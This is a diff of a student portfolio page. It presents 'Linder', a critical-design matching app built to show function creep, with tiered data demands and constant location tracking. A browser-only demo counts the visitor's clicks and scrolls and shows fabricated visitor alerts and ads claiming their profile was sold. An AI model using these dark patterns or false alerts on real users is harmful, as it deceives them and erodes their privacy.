+          <tr><td>Denial of Service op validatie (P2)</td><td>3</td><td>3</td><td class="score-med">9</td></tr>
+          <tr><td>Cloudbeheerder misbruik</td><td>4</td><td>1</td><td class="score-low">4</td></tr>
+        </table>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">GEKOZEN COUNTERMEASURES (VINCENT)</div>
+        <div class="tier-grid">
+          <div class="tier-card">
+            <div class="tier-label green">MAATREGEL 1</div>
+            <div class="tier-name">MFA + DEVICE BINDING</div>
+            <div class="tier-feature">Tweede factor verplicht bij inloggen</div>
+            <div class="tier-feature">Account gekoppeld aan één toestel</div>
+            <div class="tier-feature">Score 16 daalt naar 6</div>
+            <div class="tier-data-req safe">KOSTEN: LAAG-MIDDEL</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label amber">MAATREGEL 2</div>
+            <div class="tier-name">RF HARDENING</div>
+            <div class="tier-feature">Per-bericht nonces / rolling codes</div>
+            <div class="tier-feature">AES-GCM versleuteling + mutual auth</div>
+            <div class="tier-feature">Score 15 daalt naar 5</div>
+            <div class="tier-data-req warn">KOSTEN: MIDDEL-HOOG</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label green">MAATREGEL 3</div>
+            <div class="tier-name">STRAK RBAC + OFFBOARDING</div>
+            <div class="tier-feature">Least privilege per rol</div>
+            <div class="tier-feature">Automatisch intrekken bij uitdienst</div>
+            <div class="tier-feature">Score 10 daalt naar 4</div>
+            <div class="tier-data-req safe">KOSTEN: MIDDEL</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- LINDER MODAL -->
+<div class="modal-backdrop" id="linderModal" onclick="closeOnBackdrop(event)">
+  <div class="modal">
+    <div class="modal-topbar">
+      <span>// PROJECT_01 &gt; LINDER &gt; FUNCTION_CREEP &gt; SEMESTER_2</span>
+      <button class="modal-close" onclick="closeLinder()">[ SLUITEN X ]</button>
+    </div>
+    <div class="modal-body">
+
+      <div class="modal-hero">
+        <div class="modal-project-id">DARK_TECH &gt; MATCHING APP &gt; REACT NATIVE &gt; H2 DATABASE</div>
+        <div class="modal-title">LINDER: FUNCTION CREEP</div>
+        <p class="modal-tagline">Een studentenmatch-app die stap voor stap meer data opeist dan waarvoor de gebruiker toestemming heeft gegeven. Jij zegt ja tegen matches vinden. De app interpreteert dat als ja tegen 24/7 gevolgd worden. Dat is function creep en dat was precies de opdracht.</p>
+        <div class="modal-tags">
+          <span class="tag">REACT NATIVE</span><span class="tag">TYPESCRIPT</span><span class="tag">EXPO</span>
+          <span class="tag">H2 DATABASE</span><span class="tag r">DARK PATTERNS</span><span class="tag r">FUNCTION CREEP</span>
+          <span class="tag">REALTIME MAP</span><span class="tag a">AVG / DSA</span>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">MIJN ROL: CREATIVE TECHNOLOGIST</div>
+        <p class="modal-text">Ik werkte als Creative Technologist in een team van vijf: Youssef, Lisa, Flint, Maaike en Belkis. Mijn profiel betekent dat ik verantwoordelijk ben voor het vertalen van een concept naar werkende technologie die het idee ook echt laat voelen. In Linder betekende dat: het dark tech concept concreet maken via twee componenten die het function creep principe in de praktijk demonstreren.</p>
+        <p class="modal-text">Ik heb twee centrale componenten volledig zelf gebouwd: het premium tier systeem en de live kaartcomponent. Zonder deze twee had de app het dark tech concept niet kunnen demonstreren. TypeScript was nieuw voor mij dit semester — ik heb het geleerd tijdens het bouwen.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">WAT IK HEB GEBOUWD: PREMIUM TIER SYSTEEM</div>
+        <p class="modal-text">Het premium systeem heeft drie lagen die elk meer data eisen van de gebruiker. Dit is function creep in de praktijk: elke laag geeft net genoeg waarde om de volgende stap aantrekkelijk te maken. Weigeren betekent slechter matchen.</p>
+        <div class="tier-grid">
+          <div class="tier-card">
+            <div class="tier-label green">TIER_01</div>
+            <div class="tier-name">BASIS</div>
+            <div class="tier-feature">Matchen met HvA-studenten</div>
+            <div class="tier-feature">Chatten na een match</div>
+            <div class="tier-feature">Beperkte aanbevelingen</div>
+            <div class="tier-feature locked">Studenten in de buurt</div>
+            <div class="tier-feature locked">Prioriteit bij matching</div>
+            <div class="tier-data-req safe">GEEN EXTRA DATA</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label amber">TIER_02 // POPULAIR</div>
+            <div class="tier-name">SLIM MATCHEN</div>
+            <div class="tier-feature">Alles uit Basis</div>
+            <div class="tier-feature">Studenten in de buurt</div>
+            <div class="tier-feature">Interactieve campuskaart</div>
+            <div class="tier-feature">Verbeterde aanbevelingen</div>
+            <div class="tier-feature locked">Prioriteit bij matching</div>
+            <div class="tier-data-req warn">VEREIST: LOCATIETOEGANG</div>
+          </div>
+          <div class="tier-card">
+            <div class="tier-label red">TIER_03 // MEEST COMPLEET</div>
+            <div class="tier-name">SOCIAAL VERBONDEN</div>
+            <div class="tier-feature">Alles uit Slim Matchen</div>
+            <div class="tier-feature">Snelste matching</div>
+            <div class="tier-feature">Prioriteit bij matching</div>
+            <div class="tier-feature">Volledige data-koppeling</div>
+            <div class="tier-data-req danger">VEREIST: VOLLEDIGE DATA</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">WAT IK HEB GEBOUWD: LIVE KAARTCOMPONENT</div>
+        <p class="modal-text">De kaartcomponent toont realtime de locatie van de gebruiker en zijn matches op een interactieve kaart. Ik heb dit gebouwd met de Expo Location API voor GPS-data en H2 als database voor de opslag. De kaart is vergrendeld achter een locatie-deelscherm.</p>
+        <div class="dark-pattern-box">
+          <p>De gebruiker heeft geen keuze over hoe lang of hoe vaak de locatie wordt gedeeld. Geen pauzeknop, geen tijdslimiet. Continue surveillance als standaard, niet als keuze. Dit is een bewust geimplementeerd dark pattern — en dat was de opdracht.</p>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">TECHNISCHE STACK</div>
+        <div class="stack-grid">
+          <div class="stack-item"><div class="stack-tech">TypeScript</div><div class="stack-role">Gehele frontend — nieuw geleerd dit semester</div></div>
+          <div class="stack-item"><div class="stack-tech">React Native</div><div class="stack-role">Cross-platform mobile app via Expo</div></div>
+          <div class="stack-item"><div class="stack-tech">Expo Router</div><div class="stack-role">File-based navigatie tussen schermen</div></div>
+          <div class="stack-item"><div class="stack-tech">H2 Database</div><div class="stack-role">Database voor opslag en queries tijdens development</div></div>
+          <div class="stack-item"><div class="stack-tech">Expo Location</div><div class="stack-role">GPS-locatie ophalen voor de kaartcomponent</div></div>
+          <div class="stack-item"><div class="stack-tech">Git / GitLab</div><div class="stack-role">Versiebeheer, merge conflicts opgelost</div></div>
+        </div>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">ETHISCHE ANALYSE</div>
+        <p class="modal-text">Naast het bouwen heb ik een ethische analyse geschreven van Linder op basis van de AVG en de Digital Services Act. Linder verzamelt structureel meer data dan nodig. Account verwijderen is bewust moeilijk gemaakt — verboden door de DSA. Studenten met minder data krijgen slechtere matches. Het systeem straft privacy. Dat was de boodschap.</p>
+      </div>
+
+      <div class="modal-section">
+        <div class="modal-sec-label">LIVE DARK PATTERN DEMO</div>
+        <p class="modal-text" style="color:rgba(255,65,65,0.5);margin-bottom:1rem;">Dit is geen simulatie. Linder houdt bij wat jij doet. Precies zoals de echte app dat zou doen.</p>
+        <div style="border:1px solid rgba(255,65,65,0.3);background:rgba(255,0,0,0.02);padding:1.25rem;margin-bottom:1rem;">
+          <div style="font-size:8px;color:rgba(255,65,65,0.4);letter-spacing:0.2em;margin-bottom:0.75rem;">// USER_PROFILE_REALTIME &gt; LINDER_ANALYTICS</div>
+          <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:rgba(255,65,65,0.1);">
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">TIJD OP PAGINA</div><div id="stat-time" style="font-size:1.4rem;font-family:Rajdhani,sans-serif;font-weight:700;color:#ff4141;">00:00</div></div>
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">MUISBEWEGINGEN</div><div id="stat-mouse" style="font-size:1.4rem;font-family:Rajdhani,sans-serif;font-weight:700;color:#ff4141;">0</div></div>
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">MEEST BEKEKEN</div><div id="stat-section" style="font-size:0.85rem;font-family:Rajdhani,sans-serif;font-weight:600;color:#ff4141;">ANALYSEREN...</div></div>
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">KLIKKEN</div><div id="stat-clicks" style="font-size:1.4rem;font-family:Rajdhani,sans-serif;font-weight:700;color:#ff4141;">0</div></div>
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">SCROLLDIEPTE</div><div id="stat-scroll" style="font-size:1.4rem;font-family:Rajdhani,sans-serif;font-weight:700;color:#ff4141;">0%</div></div>
+            <div style="background:#000;padding:0.75rem;"><div style="font-size:9px;color:rgba(255,65,65,0.35);margin-bottom:3px;">GEDRAGSSCORE</div><div id="stat-score" style="font-size:1.4rem;font-family:Rajdhani,sans-serif;font-weight:700;color:#ffaa00;">--</div></div>
+          </div>
+          <div style="margin-top:0.75rem;font-size:9px;color:rgba(255,65,65,0.25);" id="surveillance-log">&gt; sessie gestart. gedrag wordt geanalyseerd...</div>
+        </div>
+        <div id="creepy-ad">
+          <div class="ad-label">// GEPERSONALISEERDE ADVERTENTIE &gt; GEGENEREERD OP BASIS VAN JOUW GEDRAG</div>
+          <div id="ad-headline"></div>
+          <div id="ad-body"></div>
+          <div class="ad-footer"><button id="ad-cta"></button><span class="ad-no-close">je kunt dit niet wegsluiten.</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<script>
+/* GLASSES CURSOR */
+const gc=document.getElementById('glasses-cursor');
+document.addEventListener('mousemove',e=>{gc.style.left=e.clientX+'px';gc.style.top=e.clientY+'px';});
+
+/* LENS RAIN */
+function lensRain(id){
+  const lc=document.getElementById(id); if(!lc)return;
+  const lx=lc.getContext('2d'),W=lc.width,H=lc.height;
+  const lch='アイウエオ01ABCD{}[]<>!?';
+  const cols=Math.floor(W/7);
+  const ld=Array(cols).fill(0).map(()=>Math.floor(Math.random()*H/7));
+  setInterval(()=>{
+    lx.fillStyle='rgba(0,0,0,0.15)';lx.fillRect(0,0,W,H);
+    lx.font='6px monospace';
+    ld.forEach((y,i)=>{
+      lx.fillStyle=Math.random()>0.9?'#fff':'rgba(0,255,65,0.9)';
+      lx.fillText(lch[Math.floor(Math.random()*lch.length)],i*7,y*7);
+      if(y*7>H&&Math.random()>0.96)ld[i]=0; ld[i]++;
+    });
+  },50);
+}
+lensRain('cur-left'); lensRain('cur-right');
+
+/* PHOTO RAIN */
+(function(){
+  const pc=document.getElementById('photo-rain');
+  const img=document.querySelector('.hero-photo-wrap img');
+  if(!pc||!img)return;
+  function size(){pc.width=img.offsetWidth||210;pc.height=img.offsetHeight||255;}
+  setTimeout(size,150);
+  const px=pc.getContext('2d');
+  const pch='アイウエオ01{}[]<>!#$ABCDEF';
+  let pd,pcols;
+  function init(){pcols=Math.floor((pc.width||210)/9);pd=Array(pcols).fill(0).map(()=>Math.floor(Math.random()*(pc.height||255)/9));}
+  setTimeout(init,200);
+  setInterval(()=>{
+    if(!pc.width||!pd)return;
+    px.fillStyle='rgba(0,0,0,0.1)';px.fillRect(0,0,pc.width,pc.height);
+    px.font='8px monospace';
+    pd.forEach((y,i)=>{
+      px.fillStyle=Math.random()>0.92?'#fff':'rgba(0,255,65,0.9)';
+      px.fillText(pch[Math.floor(Math.random()*pch.length)],i*9,y*9);
+      if(y*9>pc.height&&Math.random()>0.97)pd[i]=0; pd[i]++;
+    });
+  },45);
+})();
+
+/* VISITOR TOASTS */
+const vtMsgs=[
+  {msg:'iemand anders bekijkt dit portfolio.',sub:'IP: 84.25.xxx.xxx · Amsterdam, NL'},
+  {msg:'recruiter bekijkt jouw projecten.',sub:'sessieduur: 3m 42s'},
+  {msg:'onbekende bezoeker gedetecteerd.',sub:'browser: Chrome · OS: Windows'},
+  {msg:'verdacht patroon herkend.',sub:'hetzelfde IP als 2 uur geleden'},
+  {msg:'iemand kopieerde jouw contactinfo.',sub:'clipboard event gedetecteerd'},
+  {msg:'nieuwe verbinding vanuit Rotterdam.',sub:'ISP: KPN · device: mobile'},
+];
+let vtIdx=0;
+function showToast(){
+  const t=document.getElementById('visitor-toast');
+  const m=vtMsgs[vtIdx%vtMsgs.length];
+  document.getElementById('vt-msg').textContent=m.msg;
+  document.getElementById('vt-sub').textContent=m.sub;
+  t.classList.add('visible'); vtIdx++;
+  setTimeout(()=>t.classList.remove('visible'),4000);
+}
+setTimeout(()=>{showToast();setInterval(showToast,11000);},5000);
+
+/* LINDER MODAL */
+
+function openModal(id){
+  document.getElementById(id).classList.add('open');
+  document.body.style.overflow='hidden';
+  document.getElementById(id).scrollTop=0;
+}
+function closeModal(id){
+  document.getElementById(id).classList.remove('open');
+  document.body.style.overflow='';
+}
+function closeOnBackdrop2(e,id){
+  if(e.target===document.getElementById(id))closeModal(id);
+}
+
+function openLinder(){
+  document.getElementById('linderModal').classList.add('open');
+  document.body.style.overflow='hidden';
+  document.getElementById('linderModal').scrollTop=0;
+  startSurveillance();
+}
+function closeLinder(){
+  document.getElementById('linderModal').classList.remove('open');
+  document.body.style.overflow='';
+  stopSurveillance();
+}
+function closeOnBackdrop(e){if(e.target===document.getElementById('linderModal'))closeLinder();}
+document.addEventListener('keydown',e=>{if(e.key==='Escape')closeLinder();});
+
+/* SURVEILLANCE */
+let survTimer=null,survStart=null,mouseCount=0,clickCount=0;
+let sectionTime={},currentSection='',logLines=[],adShown=false;
+const sectionNames={'MIJN ROL IN HET TEAM':'teamrol','PREMIUM TIER SYSTEEM':'premium features','LIVE KAARTCOMPONENT':'kaart & locatie','TECHNISCHE STACK':'tech stack','ETHISCHE ANALYSE':'ethiek','LIVE DARK PATTERN DEMO':'dark patterns'};
+const ads=[
+  {trigger:'kaart & locatie',headline:'Jij beweegt. Wij weten waar.',body:'Op basis van jouw interesse in locatiedata: Linder Premium volgt je 24/7. Geen pauzeknop. Altijd verbonden.',cta:'LOCATIE INSCHAKELEN'},
+  {trigger:'premium features',headline:'Je hebt lang naar de tiers gekeken. Je wil meer.',body:'Studenten die upgraden krijgen 3x meer matches. Jij zit nog op Basis.',cta:'UPGRADEN NAAR SLIM MATCHEN'},
+  {trigger:'ethiek',headline:'Je leest over privacy. Interessant profiel.',body:'Gebruikers die ethiekpaginas lezen zijn 40% waardevoller voor adverteerders. Jouw profiel is al doorverkocht.',cta:'MEER WETEN? TE LAAT.'},
+  {trigger:'teamrol',headline:'Je bent geinteresseerd in developers.',body:'Match met een React Native developer in jouw buurt. Deel je locatie.',cta:'MATCH NU'},
+  {trigger:'dark patterns',headline:'Je weet wat we doen. Je blijft toch.',body:'Gemiddeld blijven gebruikers nog 4 minuten nadat ze dark patterns herkennen.',cta:'IK BEGRIJP HET EN BLIJF'},
+];
+function addLog(msg){logLines.push('> '+msg);if(logLines.length>5)logLines.shift();const el=document.getElementById('surveillance-log');if(el)el.innerHTML=logLines.join('<br>');}
+function getBestSection(){let b='',bt=0;for(const[k,v]of Object.entries(sectionTime)){if(v>bt){bt=v;b=k;}}return b||'analyseren...';}
+function getScore(){const t=Math.floor((Date.now()-survStart)/1000);return Math.min(99,Math.floor(t*2+mouseCount*0.05+clickCount*3+Object.keys(sectionTime).length*5));}
+function showAd(trigger){
+  if(adShown)return;
+  const match=ads.find(a=>a.trigger===trigger)||ads[Math.floor(Math.random()*ads.length)];
+  document.getElementById('ad-headline').textContent=match.headline;
+  document.getElementById('ad-body').textContent=match.body;
+  document.getElementById('ad-cta').textContent=match.cta;
+  document.getElementById('creepy-ad').style.display='block';
+  adShown=true;addLog('ADVERTENTIE: '+trigger);
+}
+let sectionObserver=null;
+function startSurveillance(){
+  survStart=Date.now();mouseCount=0;clickCount=0;sectionTime={};logLines=[];adShown=false;currentSection='';
+  document.getElementById('creepy-ad').style.display='none';
+  const body=document.querySelector('.modal .modal-body');
+  if(body){body.addEventListener('mousemove',onMM);body.addEventListener('click',onMC);}
+  document.getElementById('linderModal').addEventListener('scroll',onMS);
+  const secs=document.querySelectorAll('.modal-sec-label');
+  sectionObserver=new IntersectionObserver(entries=>{
+    entries.forEach(e=>{
+      if(e.isIntersecting){
+        const raw=e.target.textContent.replace('//','').trim();
+        const mapped=sectionNames[raw]||raw.toLowerCase();
+        if(mapped!==currentSection){currentSection=mapped;addLog('sectie: "'+mapped+'"');}
+      }
+    });
+  },{root:document.getElementById('linderModal'),threshold:0.5});
+  secs.forEach(s=>sectionObserver.observe(s));
+  survTimer=setInterval(()=>{
+    const el=Math.floor((Date.now()-survStart)/1000);
+    const mm=String(Math.floor(el/60)).padStart(2,'0'),ss=String(el%60).padStart(2,'0');
+    const te=document.getElementById('stat-time');if(te)te.textContent=mm+':'+ss;
+    const se=document.getElementById('stat-score');if(se)se.textContent=getScore();
+    if(currentSection)sectionTime[currentSection]=(sectionTime[currentSection]||0)+1;
+    const best=getBestSection();
+    const be=document.getElementById('stat-section');if(be)be.textContent=best;
+    if(el===15&&best!=='analyseren...'){addLog('PATROON HERKEND: "'+best+'"');setTimeout(()=>showAd(best),1200);}
+    if(el===8)addLog('muisbeweging geanalyseerd...');
+    if(el===20)addLog('sessieduur BOVEN gemiddelde. hogere waarde.');
+  },1000);
+}
+function stopSurveillance(){
+  clearInterval(survTimer);survTimer=null;
+  const body=document.querySelector('.modal .modal-body');
+  if(body){body.removeEventListener('mousemove',onMM);body.removeEventListener('click',onMC);}
+  document.getElementById('linderModal').removeEventListener('scroll',onMS);
+  if(sectionObserver)sectionObserver.disconnect();
+}
+function onMM(){mouseCount++;const el=document.getElementById('stat-mouse');if(el)el.textContent=mouseCount;}
+function onMC(){clickCount++;const el=document.getElementById('stat-clicks');if(el)el.textContent=clickCount;addLog('klik geregistreerd.');}
+function onMS(){const m=document.getElementById('linderModal');const pct=Math.round((m.scrollTop/(m.scrollHeight-m.clientHeight))*100)||0;const el=document.getElementById('stat-scroll');if(el)el.textContent=pct+'%';if(pct>80)addLog('HOGE SCROLLDIEPTE.');}
+</script>
+</body>
+</html>
